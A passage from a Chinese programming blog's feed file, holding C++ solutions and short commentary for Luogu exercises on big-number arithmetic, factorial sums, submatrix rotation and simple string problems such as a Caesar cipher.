class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="type">int</span> temp = res[i + j + <span class="number">1</span>] + A[i] * B[j] + carry;        <span class="comment">//dp</span></span><br><span class="line">            res[i + j + <span class="number">1</span>] = temp % <span class="number">10</span>;</span><br><span class="line">            carry = temp / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res[i] += carry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (res.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; res[<span class="number">0</span>] == <span class="number">0</span>) &#123;<span class="comment">//移除前导0</span></span><br><span class="line">        res.<span class="built_in">erase</span>(res.<span class="built_in">begin</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  string a, b;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; A, B;</span><br><span class="line">  cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; a.<span class="built_in">size</span>(); i++)</span><br><span class="line">    A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; b.<span class="built_in">size</span>(); i++)</span><br><span class="line">    B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; res = <span class="built_in">mul</span>(A, B);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;tmp : res) &#123;</span><br><span class="line">    cout &lt;&lt; tmp;</span><br><span class="line">  &#125;</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1009-NOIP1998-普及组-阶乘之和"><a href="#P1009-NOIP1998-普及组-阶乘之和" class="headerlink" title="P1009 [NOIP1998 普及组] 阶乘之和"></a>P1009 [NOIP1998 普及组] 阶乘之和</h3><p><img src="洛谷模拟与高精度.assets/image-20240708105048491.png" alt="image-20240708105048491"></p><p>这时候就用上我们前面写的高精度了，下面是我原来的做法，由于我们计算的是大数，因此只有当<code>#define int long long</code>时才能得到正确答案（超出tmp和carry的范围），如果我们想支持更多的数，就要添加除法和减法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">add</span><span class="params">(vector&lt;<span class="type">int</span>&gt; A, vector&lt;<span class="type">int</span>&gt; B)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">reverse</span>(A.<span class="built_in">begin</span>(), A.<span class="built_in">end</span>());</span><br><span class="line">  <span class="built_in">reverse</span>(B.<span class="built_in">begin</span>(), B.<span class="built_in">end</span>());</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">  <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || i &lt; B.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>())</span><br><span class="line">      tmp += A[i];</span><br><span class="line">    <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>())</span><br><span class="line">      tmp += B[i];</span><br><span class="line">    res.<span class="built_in">push_back</span>(tmp % <span class="number">10</span>);</span><br><span class="line">    tmp /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (tmp)</span><br><span class="line">    res.<span class="built_in">push_back</span>(tmp);</span><br><span class="line">  <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>());</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">mul</span><span class="params">(vector&lt;<span class="type">int</span>&gt; A, vector&lt;<span class="type">int</span>&gt; B)</span> </span>&#123;</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">res</span><span class="params">(A.size() + B.size(), <span class="number">0</span>)</span></span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    <span class="type">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = B.<span class="built_in">size</span>() - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">      <span class="type">int</span> tmp = res[i + j + <span class="number">1</span>] + carry + A[i] * B[j];</span><br><span class="line">      res[i + j + <span class="number">1</span>] = tmp % <span class="number">10</span>;</span><br><span class="line">      carry = tmp / <span class="number">10</span>;<span class="comment">//进位</span></span><br><span class="line">    &#125;</span><br><span class="line">    res[i] += carry;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (res.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; res[<span class="number">0</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">    res.<span class="built_in">erase</span>(res.<span class="built_in">begin</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> x;</span><br><span class="line"></span><br><span class="line">  cin &gt;&gt; x;</span><br><span class="line"></span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; res2 = &#123;<span class="number">1</span>&#125;; <span class="comment">//阶乘</span></span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; res4 = &#123;<span class="number">0</span>&#125;; <span class="comment">//阶乘和</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= x; i++) &#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; current = &#123;i&#125;;</span><br><span class="line">    res2 = <span class="built_in">mul</span>(current, res2);</span><br><span class="line">    res4 = <span class="built_in">add</span>(res2, res4);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;tmp : res4)</span><br><span class="line">    cout &lt;&lt; tmp ;</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们可以改用<code>n*1</code>的乘法，因为50一定是能用int容纳的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">add</span><span class="params">(vector&lt;<span class="type">int</span>&gt; A, vector&lt;<span class="type">int</span>&gt; B)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">  <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || i &lt; B.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>())</span><br><span class="line">      tmp += A[i];</span><br><span class="line">    <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>())</span><br><span class="line">      tmp += B[i];</span><br><span class="line">    res.<span class="built_in">push_back</span>(tmp % <span class="number">10</span>);</span><br><span class="line">    tmp /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (tmp)</span><br><span class="line">    res.<span class="built_in">push_back</span>(tmp);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">mul</span><span class="params">(vector&lt;<span class="type">int</span>&gt; A, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"> </span>&#123;  </span><br><span class="line">       </span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || t; i ++ )</span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>())   t += A[i] * b;</span><br><span class="line">            C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);</span><br><span class="line">            t /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back();            </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> C;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> x;</span><br><span class="line"></span><br><span class="line">  cin &gt;&gt; x;</span><br><span class="line"></span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; res2 = &#123;<span class="number">1</span>&#125;; <span class="comment">//阶乘</span></span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; res4 = &#123;<span class="number">0</span>&#125;; <span class="comment">//阶乘和</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= x; i++) &#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; current = &#123;i&#125;;</span><br><span class="line">    res2 = <span class="built_in">mul</span>(res2, i);</span><br><span class="line">    res4 = <span class="built_in">add</span>(res2, res4);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> tmp = res<span class="number">4.</span><span class="built_in">size</span>() - <span class="number">1</span>; tmp &gt;= <span class="number">0</span>; tmp--)</span><br><span class="line">    cout &lt;&lt; res4[tmp] ;</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P4924-1007-魔法少女小Scarlet"><a href="#P4924-1007-魔法少女小Scarlet" class="headerlink" title="P4924 [1007] 魔法少女小Scarlet"></a>P4924 [1007] 魔法少女小Scarlet</h3><p><img src="洛谷模拟与高精度.assets/image-20240708111615493.png" alt="image-20240708111615493"></p><p>我们需要模拟矩阵的子矩阵的转置。</p><p>矩阵转置可以分为两步，首先交换矩阵对角线的值。这里要注意即使在中心点，x和y也可能不是对称的，即我们只能用x表示x，用y表示y。</p><ul><li>对于顺时针转置矩阵，我们需要交换每列</li><li>对于逆时针转置矩阵，我们需要交换每行</li></ul><p>这里感觉c数组更方便做，cpp看得头晕X﹏X</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; matrix;</span><br><span class="line"></span><br><span class="line"><span class="comment">// void transpose(int x, int y, int n)&#123;</span></span><br><span class="line"><span class="comment">//   for(int i = x - n; i &lt;= x + n; i ++)</span></span><br><span class="line"><span class="comment">//   &#123;</span></span><br><span class="line"><span class="comment">//     for(int j = y - n; j &lt;= y + n; j++)</span></span><br><span class="line"><span class="comment">//        if (i &lt; j) &#123;     //若无此判断等于没交换</span></span><br><span class="line"><span class="comment">//                 swap(matrix[i][j], matrix[j][i]);   </span></span><br><span class="line"><span class="comment">//             &#125;</span></span><br><span class="line"><span class="comment">//   &#125;</span></span><br><span class="line"><span class="comment">// &#125;  由于x和y并不是对称的，这个交换在x，y不同时会出现错误,</span></span><br><span class="line"><span class="comment">//如（20，2）与（2，20）交换，尽管要转置的矩阵大小只有3</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">transpose</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n * <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt;= n * <span class="number">2</span>; j++) &#123;<span class="comment">//确保不会重复交换</span></span><br><span class="line">            <span class="built_in">swap</span>(matrix[x - n + i][y - n + j], matrix[x - n + j][y - n + i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rotateClockwise</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">transpose</span>(x, y, n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = x - n; i &lt;= x + n; i++) &#123;</span><br><span class="line">        <span class="built_in">reverse</span>(matrix[i].<span class="built_in">begin</span>() + (y - n), matrix[i].<span class="built_in">begin</span>() + (y + n + <span class="number">1</span>));</span><br><span class="line">        <span class="comment">//reverse不包括last所指的元素</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rotateCounterwise</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">transpose</span>(x, y, n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = y - n; j &lt;= y + n; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = x - n, k = x + n; i &lt; k; i++, k--) &#123;<span class="comment">//双指针</span></span><br><span class="line">            <span class="built_in">swap</span>(matrix[i][j], matrix[k][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  matrix.<span class="built_in">resize</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n + <span class="number">1</span>, <span class="number">0</span>));<span class="comment">//预留并初始化为0</span></span><br><span class="line">  <span class="type">int</span> tmp = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">      matrix[i][j] = tmp++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">      cout &lt;&lt; matrix[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">  <span class="built_in">init</span>(n);</span><br><span class="line">  <span class="type">int</span> x, y, r, z;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">    cin &gt;&gt; x &gt;&gt; y &gt;&gt; r &gt;&gt; z;</span><br><span class="line">    <span class="comment">//cout &lt;&lt; x &lt;&lt; y &lt;&lt; r &lt;&lt; z &lt;&lt; endl;</span></span><br><span class="line">    <span class="keyword">if</span> (z == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">rotateClockwise</span>(x, y, r);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(z == <span class="number">1</span>)&#123;</span><br><span class="line">      <span class="built_in">rotateCounterwise</span>(x, y, r);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">display</span>(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷题单——字符串</title>
      <link href="/2024/05/13/%E7%AE%97%E6%B3%95/%E6%B4%9B%E8%B0%B7%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2024/05/13/%E7%AE%97%E6%B3%95/%E6%B4%9B%E8%B0%B7%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<h3 id="P5733-【深基6-例1】自动修正"><a href="#P5733-【深基6-例1】自动修正" class="headerlink" title="P5733 【深基6.例1】自动修正"></a>P5733 【深基6.例1】自动修正</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240514200940300.png" alt="image-20240514200940300"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">string a;</span><br><span class="line"><span class="built_in">getline</span>(cin, a);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span>&amp; tmp : a)</span><br><span class="line">&#123;</span><br><span class="line">tmp = <span class="built_in">toupper</span>(tmp);</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1914-小书童——凯撒密码"><a href="#P1914-小书童——凯撒密码" class="headerlink" title="P1914 小书童——凯撒密码"></a>P1914 小书童——凯撒密码</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240514201119286.png" alt="image-20240514201119286"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">string a;</span><br><span class="line"><span class="type">int</span> mv;</span><br><span class="line">cin &gt;&gt; mv;</span><br><span class="line">cin.<span class="built_in">ignore</span>();</span><br><span class="line"><span class="built_in">getline</span>(cin, a);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span>&amp; tmp : a)</span><br><span class="line">&#123;</span><br><span class="line">tmp =(tmp - <span class="string">&#x27;a&#x27;</span> + mv)%<span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1125-NOIP2008-提高组-笨小猴"><a href="#P1125-NOIP2008-提高组-笨小猴" class="headerlink" title="P1125 [NOIP2008 提高组] 笨小猴"></a>P1125 [NOIP2008 提高组] 笨小猴</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240514201203246.png" alt="image-20240514201203246"></p><p>经典看错题目，没注意到<code>No Answer</code>时输出0。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">30</span>;</span><br><span class="line"><span class="type">int</span> arr[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> max = <span class="number">0</span>, min = <span class="number">10000</span>;</span><br><span class="line"></span><br><span class="line">string a;</span><br><span class="line"><span class="built_in">getline</span>(cin, a);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span>&amp; tmp : a)</span><br><span class="line">&#123;</span><br><span class="line">arr[tmp - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span 